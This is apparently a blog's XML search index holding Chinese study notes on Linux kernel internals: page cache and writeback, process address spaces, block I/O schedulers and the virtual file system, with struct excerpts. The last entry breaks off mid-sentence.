<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>页高速缓存和页回写</title>
      <link href="/2023/10/11/%E9%A1%B5%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%92%8C%E9%A1%B5%E5%9B%9E%E5%86%99/"/>
      <url>/2023/10/11/%E9%A1%B5%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%92%8C%E9%A1%B5%E5%9B%9E%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="the-Page-Cache-and-Page-Writeback"><a href="#the-Page-Cache-and-Page-Writeback" class="headerlink" title="the Page Cache and Page Writeback"></a>the Page Cache and Page Writeback</h1><p>page cache: 磁盘cache,减少磁盘IO</p><p>page writeback: page cache回写到disk</p><p>disk cache的重要性</p><ol><li>提速</li><li>局部性原理</li></ol><h2 id="缓存手段"><a href="#缓存手段" class="headerlink" title="缓存手段"></a>缓存手段</h2><p>page cache:物理内存，对应磁盘的物理块</p><p>size动态</p><p>称为backing store（后背存储）</p><p>内核执行读操作，先检查是否在page cache中</p><p>缓存以页为单位，而不是文件</p><h3 id="写缓存"><a href="#写缓存" class="headerlink" title="写缓存"></a>写缓存</h3><ol><li>不缓存nowrite</li><li>写透缓存write-through，双方都写</li><li>回写write-back</li></ol><h3 id="缓存回收-cache-eviction"><a href="#缓存回收-cache-eviction" class="headerlink" title="缓存回收 cache eviction"></a>缓存回收 cache eviction</h3><p>决定撤销哪些cache的策略</p><p>linux:选clean页</p><p> clairvoyant algorithm预测算法：无法实现</p><h4 id="1-最近最少使用LRU"><a href="#1-最近最少使用LRU" class="headerlink" title="1 最近最少使用LRU"></a>1 最近最少使用LRU</h4><h4 id="2-双链策略"><a href="#2-双链策略" class="headerlink" title="2 双链策略"></a>2 双链策略</h4><p>活跃链表active list:不可换出</p><p>inactive list</p><p>两个链表需要维持平衡，解决了LRU算法仅对一次访问的窘境</p><p>称为LRU/2,也可扩展到n个链表LRU/n</p><h2 id="linux-page-cache"><a href="#linux-page-cache" class="headerlink" title="linux page cache"></a>linux page cache</h2><h3 id="address-space-对象"><a href="#address-space-对象" class="headerlink" title="address_space 对象"></a>address_space 对象</h3><p>page cache中的一夜可以包含多个不连续的物理块</p><p>由于不连续性，检查一个数据是否在cache中不容易</p><p>不能直接用设备名+块号寻找cache</p><p>可以用page cache扩展inode 结构体：会让page cache 局限于文件</p><p>为了维持普遍性，采用address_space结构体</p><p>是vm_area_struct的物理地址对等体</p><p>一个文件可以被10个vm_area_struct标识，但只能被一个addres_space标识</p><p>文不对题，应该叫page_cache_entity或physical_pages_of_a_file</p><p>定义在&lt;linux/fs.h&gt;</p><pre><code>struct address_space&#123;    struct inode            *host;    ...    struct prio_tree_root     i_mmap;&#125;</code></pre><p>i_mmap所有这个address space内的映射的有限搜索树</p><p>往往会和一些内核对象关联，通常情况下和一个索引节点关联inode</p><p>此时host域指向索引节点</p><p>和swapper关联，host域置为NULL</p><h3 id="address-space-操作"><a href="#address-space-操作" class="headerlink" title="address_space 操作"></a>address_space 操作</h3><p>readpage()和writepage()最重要</p><p>读操作包含的步骤：</p><p>在页高速缓存找到需要的数据,find_get_page负责完成</p><pre><code>page = find_get_page(address_space mapping, offset index)</code></pre><p>如果搜索的页不在cache，会返回NULL，并分配新页面加入cache</p><p>需要的数据从磁盘中读入，再写到page cache中，然后返回给用户</p><pre><code>error = mapping-&gt;a_ops_readpage(file, page);</code></pre><p>写操作对于mapping只需要</p><pre><code>SetPageDirty(page);</code></pre><p>晚些时候调用writepage()</p><pre><code>// 在page_cahce中搜索页page = __grab_cache_page(mapping, index, &amp;cached_page, &amp;lru_pvec); // 创建写请求status = a_ops-&gt;prepare_write(file, page, offset, offset+bytes); // 写数据从用户空间拷贝到内核空间page_fault = filemap_copy_from_user(page, offset, buf, bytes); // page写入磁盘status = a_ops-&gt;commit_write(file, page, offset, offset+bytes);</code></pre><h3 id="基树-radix-tree"><a href="#基树-radix-tree" class="headerlink" title="基树 radix tree"></a>基树 radix tree</h3><p>任何页IO操作前，内核都要检查页是否在cache</p><p>因此查找必须高效</p><p>每个address_space必须有唯一的基树，保存在page_tree结构体</p><p>基树是二叉树，只要指定偏移量，就能迅速检索，find_get_page调用radix_tree_lookup()</p><p>核心代码在lib/radix-tree.c中</p><h3 id="以前的页散列表"><a href="#以前的页散列表" class="headerlink" title="以前的页散列表"></a>以前的页散列表</h3><p>维护了系统中所有页的全局散列表</p><h2 id="缓冲区高速缓存buffer-cache"><a href="#缓冲区高速缓存buffer-cache" class="headerlink" title="缓冲区高速缓存buffer cache"></a>缓冲区高速缓存buffer cache</h2><p>减少磁盘访问，作为页高速缓存的一部分</p><p>缓冲和页高速缓存并非天生统一</p><p>2.4前一个磁盘块可以同时在两个缓存中</p><h2 id="flusher线程"><a href="#flusher线程" class="headerlink" title="flusher线程"></a>flusher线程</h2><p>以下三种情况，脏页写回磁盘：</p><ol><li>空闲内存低于阈值</li><li>脏页驻留时间超过阈值</li><li>用户调用sync和fsync</li></ol><p>2.6中a gang of 内核线程，flusher线程完成三个工作</p><p>周期性被唤醒，完成前两个工作</p><p>/proc/sys/vm中设置回写的相关参数，也可以sysctl系统调用设置</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>dirty_background_ratio</td><td></td></tr><tr><td>dirty_expire_interval</td><td>超时多久</td></tr><tr><td>dirty_ratio</td><td></td></tr><tr><td>dirty_writeback_interval</td><td>pdflush运行频率</td></tr><tr><td>laptop_mode</td><td></td></tr></tbody></table><h3 id="laptop-mode"><a href="#laptop-mode" class="headerlink" title="laptop mode"></a>laptop mode</h3><p>让硬盘机械行为最小化，允许硬盘长时间停止，延长电池时间</p><p>找准时机，一次写磁盘写很多</p><p>要求别的阈值也尽可能大</p><p>多数linux会在充电时自动关闭，拔电源时自动开启</p><h3 id="bdflush-kupdated和pdflush"><a href="#bdflush-kupdated和pdflush" class="headerlink" title="bdflush,kupdated和pdflush"></a>bdflush,kupdated和pdflush</h3><p>2.6前，前两者</p><p>基于缓冲，只有一个bdflush</p><p>2.6pdflush</p><p>面向所有磁盘，容易拥塞</p><p>2.6.32后flusher</p><p>flusher针对每个磁盘独立执行回写</p><h3 id="避免拥塞：多线程"><a href="#避免拥塞：多线程" class="headerlink" title="避免拥塞：多线程"></a>避免拥塞：多线程</h3><p>bdflush</p>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程地址空间</title>
      <link href="/2023/10/07/%E8%BF%9B%E7%A8%8B%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/"/>
      <url>/2023/10/07/%E8%BF%9B%E7%A8%8B%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h1><h2 id="15-1-地址空间"><a href="#15-1-地址空间" class="headerlink" title="15.1 地址空间"></a>15.1 地址空间</h2><h2 id="15-2-内存描述符"><a href="#15-2-内存描述符" class="headerlink" title="15.2 内存描述符"></a>15.2 内存描述符</h2><p>内核用内存描述符，表示进程的地址空间，描述了与进程地址有关的所有信息</p><p>mm_struct结构体，定义在&lt;linux/sched.h&gt;中</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> mm_struct<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> vm_area_struct     <span class="token operator">*</span>mmap<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*内存区域链表*/</span>    <span class="token keyword">struct</span> rb_root            mm_rb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*VMA形成的红黑树*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    pgd_t                    <span class="token operator">*</span>pgd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> list_head        mmlist<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*所有mm_struct形成的链表*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    atomic_t                mm_users<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*使用地址空间的用户数*/</span>    atomic_t                mm_count<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*主使用计数器*/</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>mm_users：如果两个线程共享地址空间，则等于2, mm_count为增加量，则为1</p><p>​                    9个线程共享，mm_count仍为1</p><p>只有mm_users减为0，mm_count才为0，结构体撤销</p><p>mmap和mm_rb描述的对象相同，地址空间中所有的内存区域</p><p>前者以链表形式，后者以红黑树</p><p>冗余的意义：链表适合便利，mm_rb适合搜索</p><p>mm_struct：通过 mmlist域连接在双向链表，首元素是init_mm内存描述符，代表init进程的地址空间</p><p>操作时使用mmlist_lock，定义在kernel/fork.c</p><h3 id="15-2-1-分配内存描述符"><a href="#15-2-1-分配内存描述符" class="headerlink" title="15.2.1 分配内存描述符"></a>15.2.1 分配内存描述符</h3><p>进程描述符task_struct中，mm域存放进程使用的内存描述符，current-&gt;mm</p><p>fork()函数利用copy_mm复制父进程的内存描述符</p><p>mm_struct实际由fork.c中的allocate_mm()宏，从mm_cachep slab缓存中分配得到‘</p><p>通常，每个进程有唯一的mm_struct，即唯一进程地址空间</p><p>如果父进程希望和子进程共享地址空间，<strong>调用clone()时设置CLONE_VM标志，这样的进程为线程</strong></p><p>CLONE_VM仅需要在调用copy_mm()函数将mm域指向父进程的mm_struct</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>clone_flags <span class="token operator">&amp;</span> CLONE_VM<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*    *    current是父进程而tsk在fork()执行期间是子进程    */</span>    <span class="token function">atomic_inc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>current<span class="token operator">-></span>mm<span class="token operator">-></span>mm_users<span class="token punctuation">)</span><span class="token punctuation">;</span>    tsk<span class="token operator">-></span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><h3 id="15-2-2-撤销内存描述符"><a href="#15-2-2-撤销内存描述符" class="headerlink" title="15.2.2  撤销内存描述符"></a>15.2.2  撤销内存描述符</h3><p>进程退出时，内核调用定义在kernel/exit.c中的exit_mm()函数</p><p>更新统计量，调用mmput()减少mm_users计数</p><p>调用mmdrop()减少mm_count计数</p><p>调用free_mm()宏，归还到mm_cachep slab缓存</p><h3 id="15-2-3-mm-struct域内核线程"><a href="#15-2-3-mm-struct域内核线程" class="headerlink" title="15.2.3 mm_struct域内核线程"></a>15.2.3 mm_struct域内核线程</h3><p>内核线程没用进程地址空间，没有内存描述符，所以进程描述符中mm为空</p><p>内核线程不需要访问任何用户空间的内存</p><p>不需要自己的内存描述符和页表</p><p>为了避免切换地址空间，内核线程直接使用前一个进程的内存描述符</p><p>当进程调度时，mm域指向的地址空间被装载到内存，进程描述符中的active_mm域被更新</p><p>内核mm域为空，当内核线程被调度时，会保留前一个进程的地址空间，内核更新进程描述符中的active_mm为前一个进程的mm</p><p>需要时，内核线程可使用前一个进程的页表，仅使用地址空间中和内核相关的信息（存在可以访问用户空间信息的可能）</p><h2 id="15-3-虚拟内存区域"><a href="#15-3-虚拟内存区域" class="headerlink" title="15.3 虚拟内存区域"></a>15.3 虚拟内存区域</h2><p>内存区域由vm_area_struct结构体描述，定义在&lt;linux/mm_types.h&gt;</p><p>虚拟内存区域 virtual memeoryAreas, VMAs</p><p>vm_area_struct描述了连续区间的独立内存范围</p><p>每个VMA可代表不同的内存区域：内存映射文件，进程用户空间栈</p><pre><code>struct vm_area_struct&#123;    struct mm_struct        *vm_mm;    unsigned long             vm_start;    unsigned long             vm_end;    struct vm_area_struct    *vm_next;    pgprog_t                vm_page_prot;    unsigned long            vm_flags;    ...    struct vm_operations_struct    &amp;vm_ops;    ...&#125;</code></pre><p>每个VMA对其相关的mm_struct都是唯一的</p><h3 id="15-3-1-VMA标志"><a href="#15-3-1-VMA标志" class="headerlink" title="15.3.1 VMA标志"></a>15.3.1 VMA标志</h3><p>&lt;linux/mm.h&gt;</p><p>包含在vm_flags域内</p><p>反映了内核处理页面需要遵守的行为准则，而不是硬件要求</p><table><thead><tr><th>标志</th><th>对VMA以及页面的影响</th></tr></thead><tbody><tr><td>VM_READ,VM_WRITE,VM_EXEC</td><td></td></tr><tr><td>VM_SHARED</td><td>页面可共享</td></tr><tr><td>VM_MAYREAD,…</td><td>READ，WRITE，EXEC可设置</td></tr><tr><td>VM_GROWSDOWN</td><td>可向下增长</td></tr><tr><td>VM_SHM</td><td>可做共享内存</td></tr><tr><td>VM_IO</td><td>页面映射设备IO空间</td></tr><tr><td>VM_SEQ_READ</td><td>可能被连续访问</td></tr><tr><td>VM_DONTCOPY</td><td>不能在fork时被拷贝</td></tr><tr><td>VM_RESERVED</td><td>区域不能被换出</td></tr></tbody></table><p>页面的权限还要和访问权限配合</p><p>VM_IO常在驱动设备执行的mmap()函数中设置，同时表示内存区域不能被包含在任何进程的core dump中</p><p>VM_SEQ_READ,VM_RAND_READ决定内核是否有必要预读取文件</p><h3 id="15-3-2-VMA操作"><a href="#15-3-2-VMA操作" class="headerlink" title="15.3.2 VMA操作"></a>15.3.2 VMA操作</h3><pre><code>struct vm_operations_struct&#123;    //内存区域被加入地址空间    void(*open)(struct vm_area_struct *);    //内存区域被删除    void(*close)(struct vm_area_struct *);    //没有出现在物理内存的页面    int(*fault)(struct vm_area_struct *, struct vm_fault *);    //只读被写    int(*page_mkwrite)(struct vm_area_struct *, struct vm_fault *);    //get_user_pages（）调用失败，access_process_vm()调用    int(*access)(struct vm_area_struct *,unsigned long, void*, int, int);&#125;</code></pre><h3 id="15-3-3-内存区域的树形和链表结构"><a href="#15-3-3-内存区域的树形和链表结构" class="headerlink" title="15.3.3 内存区域的树形和链表结构"></a>15.3.3 内存区域的树形和链表结构</h3><h3 id="15-3-4-实际使用中的内存区域"><a href="#15-3-4-实际使用中的内存区域" class="headerlink" title="15.3.4 实际使用中的内存区域"></a>15.3.4 实际使用中的内存区域</h3><p>cat /proc/1426/maps可查看内存区域</p><p>不可写的内存区域可以只保留一份映射，所有进程的libc库在物理内存中实际只需要一份</p><p>这样的方式能节约大量的内存</p><p>没有映射文件的内存区域设备标志为00：00，索引节点标志也为0，这就是零页——零页映射的内容全0</p><h2 id="15-4-操作内存区域"><a href="#15-4-操作内存区域" class="headerlink" title="15.4 操作内存区域"></a>15.4 操作内存区域</h2><h3 id="15-4-1-find-vma"><a href="#15-4-1-find-vma" class="headerlink" title="15.4.1 find_vma()"></a>15.4.1 find_vma()</h3><p>内存地址属于哪个区域</p><p>先检查mmap_cache，再搜索红黑树</p><h3 id="15-4-2-find-vma-prev"><a href="#15-4-2-find-vma-prev" class="headerlink" title="15.4.2 find_vma_prev()"></a>15.4.2 find_vma_prev()</h3><p>返回第一个小于addr的VMA</p><h3 id="15-4-3-find-vma-intersection"><a href="#15-4-3-find-vma-intersection" class="headerlink" title="15.4.3 find_vma_intersection()"></a>15.4.3 find_vma_intersection()</h3><p>返回第一个和指定区间相交的VMA</p><h2 id="15-5-mmap-和do-mmap-：创建地址区间"><a href="#15-5-mmap-和do-mmap-：创建地址区间" class="headerlink" title="15.5 mmap()和do_mmap()：创建地址区间"></a>15.5 mmap()和do_mmap()：创建地址区间</h2><p>do_mmap:创建一个新的线性地址区间</p><pre><code>unsigned long dommap(struct file*file, unsigned long addr, unsigned long len, unsigned long prot, unsigned long flag, unsigned long offset)</code></pre><p>file取NULL，offset=0，这次映射没有文件相关：匿名映射，否则文件映射</p><p>addr:可选</p><p>用户空间通过mmap()系统调用获取do_mmap()功能</p><h2 id="15-6-mummap-和do-mummap"><a href="#15-6-mummap-和do-mummap" class="headerlink" title="15.6 mummap()和do_mummap()"></a>15.6 mummap()和do_mummap()</h2><p>删除地址空间</p><h2 id="15-7-页表"><a href="#15-7-页表" class="headerlink" title="15.7 页表"></a>15.7 页表</h2><p>内核正确设置页表的前提下，硬件才能操作他们</p><p>每个进程字节的页表，内存描述符的pgd域指向页全局目录，然后三级页表</p><p>页表对应的结构体依赖于具体的体系结构，asm/page.h</p><p>页表的管理时内核的关键部分，不断改进，2.6：</p><ol><li>高端内存分配页表</li><li>写时拷贝共享页表，（不改就不分配新的）</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20231005</title>
      <link href="/2023/10/05/2023-10-05/"/>
      <url>/2023/10/05/2023-10-05/</url>
      
        <content type="html"><![CDATA[<h1 id="块I-O"><a href="#块I-O" class="headerlink" title="块I/O"></a>块I/O</h1><p>块设备：随机访问固定大小数据片（chunks）的硬件设备</p><p>常见：硬盘，软盘驱动器，闪存</p><p>以安装FS的方式使用</p><p>字符设备：按照字符流的顺序有序访问</p><p>常见：串口，键盘</p><p>内核管理块设备比管理字符设备细致的多：</p><ol><li>因为工程量大</li><li>块设备对执行性能要求很高</li></ol><p>改写块IO层是2.5开发版内核的主要目标</p><h2 id="14-1-剖析一个块设备"><a href="#14-1-剖析一个块设备" class="headerlink" title="14.1 剖析一个块设备"></a>14.1 剖析一个块设备</h2><p>块设备的基本单元：扇区</p><p>逻辑最小可寻址单元：块</p><p>内核要求，块的大小是2的整数倍，且不能超过一个页</p><p>常用的块大小：512，1K，4K</p><p>簇，柱面和磁头：针对特定的块设备</p><h2 id="14-2-缓冲区和缓冲区头"><a href="#14-2-缓冲区和缓冲区头" class="headerlink" title="14.2 缓冲区和缓冲区头"></a>14.2 缓冲区和缓冲区头</h2><p>每个缓冲区和一个块对应，相当于磁盘块在内存中的表示</p><p>每个缓冲区有一个对应的描述符，用buffer_head表示，称为缓冲区头</p><p>在&lt;linux/buffer_head.h&gt;中定义</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> buffer_head<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> b_state<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">struct</span> page <span class="token operator">*</span>b_page<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/*存储缓冲区的页面*/</span>       sector_t b_blocknr<span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/*起始块号*/</span>    size_t b_size<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">/*映像的大小*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token keyword">struct</span> block_device <span class="token operator">*</span>b_dev<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*相关联的快设备*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    atomic_t b_count<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>b_state表示缓冲区状态，可以是多种标志的组合</p><p>合法的标志存储在bh_state_bits枚举中，该枚举在&lt;linux/buffer_head.h&gt;中定义</p><table><thead><tr><th>状态标志</th><th>意义</th></tr></thead><tbody><tr><td>BH_Uptodate</td><td>该缓冲区包含可用数据</td></tr><tr><td>BH_Dirty</td><td>缓冲区脏（内存磁盘不一致，需要更新磁盘）</td></tr><tr><td>BH_Delay</td><td>缓冲区尚未于磁盘块关联</td></tr><tr><td>BH_Boundary</td><td>处于连续块区的边界，下个块不再连续</td></tr><tr><td>BH_Quiet</td><td>缓冲区禁止错误</td></tr><tr><td>BH_Unwritten</td><td>缓冲区在硬盘上空间被申请，但没有实际数据写出</td></tr></tbody></table><p>特殊位：BH_PrivateStart，指明可被其他代码使用的起始位</p><p>块IO不会使用BH_PrivateStart或更高的位</p><p>如果驱动希望b_state域存储信息，就可以安全使用这些位。只要不与使用冲突</p><p>b_count表示缓冲区的使用记数，操作缓冲区头前，先用get_bh()函数增加缓冲区头引用计数，确保其不会再被分配出去</p><p>对应的物理块由b_blocknr.th域索引，逻辑块号</p><p>块在内存的起始地址位b_page-&gt;b_data，结束为(b_data+b_size)处</p><p><strong>2.6内核前</strong>，缓冲区头的作用更重要：不仅描述映射，还是所有块IO操作的容器</p><p>这样的弊端：</p><ul><li>缓冲区头很大（现在缩减）</li><li>数据去偷对数据的操作不方便，不清晰，内核倾向操作页面结构</li></ul><p><strong>2.6内核后</strong>，内核直接对页面，地址空间操作，不再使用缓冲区头，具体情况见address_space结构，pdflush等守护进程(daemon)</p><p>第二个弊端：仅能描述单个缓冲区，对于大块数据IO需要分解为多个buffer_head结构体。会造成不必要的负担和空间浪费</p><p>2.5引入新型，灵活，轻量级的容器，bio结构体</p><h2 id="14-3-bio结构体"><a href="#14-3-bio结构体" class="headerlink" title="14.3 bio结构体"></a>14.3 bio结构体</h2><p>块IO操作的基本容器由bio结构体表示，定义在&lt;linux/bio.h&gt;中。</p><p>该结构代表了现场的（活动的）以片段（segment）链表形式组织的块IO操作</p><p>一个片段是一小块连续的内存缓冲区。这样不需要单个缓冲区一定连续</p><p>即时一个缓冲区分散在内存多个位置，bio也能保证IO执行</p><p>这样的IO就是聚散IO</p><p>结构体定义于&lt;linux/bio.h&gt;</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> bio<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span>    bi_vcnt<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*bio_vecs偏移的个数*/</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span>    bi_idx<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*bio_io_vec的当前索引*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">struct</span> bio_vec    <span class="token operator">*</span>bi_io_vec<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*bio_vec链表*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><h3 id="14-3-1-IO向量"><a href="#14-3-1-IO向量" class="headerlink" title="14.3.1 IO向量"></a>14.3.1 IO向量</h3><p>​    bi_io_vec包含一个特定IO操作所要的所有片段。每个bio_vec都是形式为&lt;page,offset,len&gt;的向量，定义于&lt;linux/bio.h&gt;</p><p>​    当IO操作执行完毕后，bi_idx指向数组的当前索引</p><p>​    bi_idx不断更新，指向当前片段，更重要的作用在于分割bio结构体</p><p>​    RAID可以把单独的bio结构体分隔到阵列中的各个硬盘上</p><p>​    RAID设备只要拷贝结构体，将bi_idx改为需要的位置</p><p>​    bi_cnt记录使用计数</p><p>​    bi_private只用创建者可以读写</p><h3 id="14-3-2-新老方法对比"><a href="#14-3-2-新老方法对比" class="headerlink" title="14.3.2 新老方法对比"></a>14.3.2 新老方法对比</h3><p>bio代表IO操作，可以包括多个页</p><p>buffer_head代表一个缓冲区，描述磁盘的一个块</p><p>bio的好处：</p><ul><li>容易处理高端内存，处理页面而不是指针(page,offset,len)</li><li>课代表普通页IO，也可代表直接IO</li></ul><p>内核将两种结构尽量独立，使得信息尽可能少</p><h2 id="14-4-请求队列"><a href="#14-4-请求队列" class="headerlink" title="14.4 请求队列"></a>14.4 请求队列</h2><p>挂起的块IO保存在请求队列，由reques_queue结构体表示</p><p>定义在&lt;linux/blkdev,h&gt;,一个双向请求链表和相关控制信息</p><p>列表中每一项都是单独请求</p><p>请求由结构体request表示，定义在&lt;linux/blkdev,h&gt;</p><p>一个请求可能要操作多个连续磁盘块，每个请求可由多个bio组成</p><h2 id="14-5-IO调度程序"><a href="#14-5-IO调度程序" class="headerlink" title="14.5 IO调度程序"></a>14.5 IO调度程序</h2><p>缩短寻址时间是提高性能关键</p><p>预提交操作前，执行名为合并与排序的预操作</p><h3 id="14-5-1-IO调度程序的工作"><a href="#14-5-1-IO调度程序的工作" class="headerlink" title="14.5.1 IO调度程序的工作"></a>14.5.1 IO调度程序的工作</h3><p>两种操作：合并与排序 </p><h4 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h4><p>当访问的扇区与当前请求访问的扇区响铃，可以合并为一个</p><p>多个压缩为一个</p><p>排序算法：将扇区顺序有序排列，电梯调度</p><h3 id="14-5-2-linus电梯"><a href="#14-5-2-linus电梯" class="headerlink" title="14.5.2 linus电梯"></a>14.5.2 linus电梯</h3><p>2.4采用，2.6被其他两种调度程序取代</p><p>执行向前和向后合并</p><p>合并失败，寻找可能的插入点</p><p>一个请求加入到队列时，会发生四种操作：</p><ol><li>存在相邻请求，合并</li><li>驻留时间过长的请求，新请求插入队尾</li><li>存在以扇区方向为序的合适位置，插入到该位置</li><li>不存在合适位置，插入队尾</li></ol><h3 id="14-5-3-最终期限IO调度"><a href="#14-5-3-最终期限IO调度" class="headerlink" title="14.5.3 最终期限IO调度"></a>14.5.3 最终期限IO调度</h3><p>deadline：解决饥饿问题</p><p>普通的饥饿请求还会带来写-饥饿-读的问题</p><p>写操作：内核有空才给磁盘，和提交的程序异步执行</p><p>读操作：和提交的程序同步执行</p><p>读请求可能会互相依靠</p><p>如何平衡减少请求饥饿和保证吞吐量，是困难的问题</p><p>deadline:读500ms，写5s</p><p>新请求提交时，类似linus电梯</p><p>也会按类型插入到额外队列</p><p>若写FIFO，读FIFO超时，从他们中取出请求</p><p>保证了读请求迅速完成</p><p>调度程序在文件block/deadline-ioshed.c中</p><h3 id="14-5-4-预测IO调度程序"><a href="#14-5-4-预测IO调度程序" class="headerlink" title="14.5.4 预测IO调度程序"></a>14.5.4 预测IO调度程序</h3><p>deadline不足：先读定位，再写定位，损害了全局吞吐量</p><p>预测IO：增加了预测启发功能anticipation-heuristic</p><p>试图在进行IO操作期间，处理新到的读请求带来的寻址数量</p><p>不同之处在于，提交请求后，不直接返回，而是有意空闲片刻</p><p>用于提交其它读请求，任何相邻操作的请求会得到处理</p><p>等待时间结束后，预测程序重新返回原来位置，处理其它请求</p><p><strong>如果存在越来越多的同区域读请求，可以避免大量的寻址操作</strong></p><p>优势取决于能否正确预测应用程序的形为</p><p>实现在block/as-ioshed.c中</p><h3 id="14-5-5-完全公正的排队IO调度"><a href="#14-5-5-完全公正的排队IO调度" class="headerlink" title="14.5.5 完全公正的排队IO调度"></a>14.5.5 完全公正的排队IO调度</h3><p>complete fair queuing</p><p>根据进程组织：foo进程放入foo队列，bar进程放入bar队列</p><p>时间片轮转调度，每个队列选取请求数（默认为4），程序位于block/cfq-iosched.c</p><h3 id="14-5-6-空操作的IO调度"><a href="#14-5-6-空操作的IO调度" class="headerlink" title="14.5.6 空操作的IO调度"></a>14.5.6 空操作的IO调度</h3><p>只执行合并</p><p>不勤奋工作的原因：真正的随机访问设备，如闪存卡，没有寻道的负担，没必要插入排序</p><p>位于block/noop-ioshed.c</p><h3 id="14-5-7-IO调度程序的选择"><a href="#14-5-7-IO调度程序的选择" class="headerlink" title="14.5.7 IO调度程序的选择"></a>14.5.7 IO调度程序的选择</h3><p>通过elevator=foo覆盖缺省（as,cfq,deadline,noop)，默认cfq</p><h2 id="14-6-小结"><a href="#14-6-小结" class="headerlink" title="14.6 小结"></a>14.6 小结</h2><p>数据结构(bio,buffer_head)+4种调度算法</p>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023930</title>
      <link href="/2023/09/30/2023-9-30/"/>
      <url>/2023/09/30/2023-9-30/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h1><p>VFS作为内核的子系统</p><p>所有FS不但以来VFS共存，也依靠VFS协同工作</p><p>不同FS，甚至不同介质的FS可进行读写工作</p><h2 id="13-1-通用文件系统接口"><a href="#13-1-通用文件系统接口" class="headerlink" title="13.1 通用文件系统接口"></a>13.1 通用文件系统接口</h2><h2 id="13-2-文件系统抽象层"><a href="#13-2-文件系统抽象层" class="headerlink" title="13.2 文件系统抽象层"></a>13.2 文件系统抽象层</h2><p>通用文件系统模型：囊括了任何文件系统的常用功能集</p><p>可支持多种差异很大的FS，从DOS系统的FAT到windows的NTFS</p><p>一方面，系统调用时通用VFS接口，提供给用户空间的前端</p><p>另一方面，系统调用是具体文件系统的后端</p><p>userspace -&gt; VFS -&gt; FS -&gt; 物理介质</p><h3 id="13-3-Unix文件系统"><a href="#13-3-Unix文件系统" class="headerlink" title="13.3 Unix文件系统"></a>13.3 Unix文件系统</h3><p>非unix风格的FS，必须经过封装，得到符合unix概念的接口（文件，目录项，inode，挂载点）</p><h3 id="13-4-VFS对象及其数据结构"><a href="#13-4-VFS对象及其数据结构" class="headerlink" title="13.4 VFS对象及其数据结构"></a>13.4 VFS对象及其数据结构</h3><p>VFS的主要对象：</p><ul><li>超级块，代表一个具体的FS</li><li>索引节点对象，代表一个具体文件</li><li>目录项对象，代表目录项，是路径的组成部分（目录或文件）</li><li>文件对象</li></ul><p>每个主要对象，包括一个操作对象，描述了内核对主要对象可以使用的方法</p><ul><li>super_operations对象，对文件系统，如write_inode()和sync_fs()</li><li>inode_operations,create()和link（）</li><li>dentry_operations, d_compare() and 